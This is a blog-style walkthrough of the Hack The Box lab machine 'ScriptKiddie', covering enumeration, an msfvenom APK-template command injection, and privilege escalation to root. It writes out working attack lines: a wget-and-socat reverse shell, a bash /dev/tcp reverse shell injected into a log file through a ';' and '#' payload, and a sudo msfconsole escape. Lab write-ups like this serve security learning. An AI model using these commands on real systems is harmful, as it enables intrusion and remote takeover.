---
layout: post
title: ScriptKiddie
---

**ScriptKiddie is an easy machine from Hack The Box.**

### Enumeration

I'll start with a quick `nmap` scan to enumerate open ports.

`nmap -sC -sV -oN nmap/basic scriptkiddie.htb`

Pretty barebones machine, only ports 22 and 80 are open.

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I'll run a couple `gobuster` searches in the background while I check out the webserver but I'm not going to find anything.

The webpage appears to have a few different functionalities. Seems like it will run an nmap scan, create msfvenom payloads or search via searchsploit for user inputs.

![Webpage](https://user-images.githubusercontent.com/60187707/120905511-1fcd6000-c618-11eb-84a6-366d172a44fb.png)

### Initial Foothold
After searching for information about the backend system, I found an RCE script for Werkzeuk but does not seem to work as the debugging function in question is not enabled on the server.

![Pasted image 20210603130610](https://user-images.githubusercontent.com/60187707/120905665-4213ad80-c619-11eb-8fe3-241bcfae6cd0.png)

The `msfvenom` widget has Android templates as an optional file upload and, after a bit of googling, found [this script.](https://packetstormsecurity.com/files/161200/Metasploit-Framework-6.0.11-Command-Injection.html)

Essentially, it exploits a vulnerability in `msfvenom` that will execute a payload hidden inside a `.apk` template. Use `apk.py` to generate the malicious package.

![Pasted image 20210604102216](https://user-images.githubusercontent.com/60187707/120905729-b5b5ba80-c619-11eb-899b-de82a6a4ec47.png)

I tried a few various bash reverse shells as my payload, but using `socat` was what got me onto the machine.

`wget -q http://10.10.14.16/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.16:4444
`

![Pasted image 20210604101927](https://user-images.githubusercontent.com/60187707/120905760-e695ef80-c619-11eb-92a8-b21eb382e9e2.png)

I am on as the user `kid`.

#### Privesc
I do some poking around the filesystem, run `linPEAS`, and find indications of a possible `sudo` vulnerability, but that ended up being a dead-end.

Inside the user `pwn` directory, there is a script called `scanlosers.sh`. As far as I can tell, the script takes data from the file `/home/kid/logs/hackers` to run an `nmap` command.

![Pasted image 20210604121547](https://user-images.githubusercontent.com/60187707/120905835-789df800-c61a-11eb-8ea6-82ec65f9caf2.png)

I can write to `hackers` because `kid` is the owner.

![Pasted image 20210604121933](https://user-images.githubusercontent.com/60187707/120905840-8489ba00-c61a-11eb-9f3a-5468e8dd6589.png)

So, I'll start a listener and `echo` a reverse shell into `hackers`, with a `;` at the beginning to start a new command and a `#` at the end to comment out the rest of the script.

`echo "  ; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/1234 0>&1' #" >> hackers`

![Pasted image 20210604122051](https://user-images.githubusercontent.com/60187707/120905898-d7fc0800-c61a-11eb-851d-4222c175fb13.png)

Now, I'm on as user `pwn`.

Run a quick `sudo -l` to check `pwn`'s permissions.

![Pasted image 20210604122204](https://user-images.githubusercontent.com/60187707/120905913-f4984000-c61a-11eb-89c4-dbd399b3a703.png)

I can run `msfconsole` as `root` without a password. Seems promising!

Checking the `msfconsole` help page, I find a `-x` flag that will execute console commands. Could it be that easy?

`sudo msfconsole -x su`

![Pasted image 20210604122329](https://user-images.githubusercontent.com/60187707/120905920-04178900-c61b-11eb-9dfc-d12292cab333.png)

Apparently!
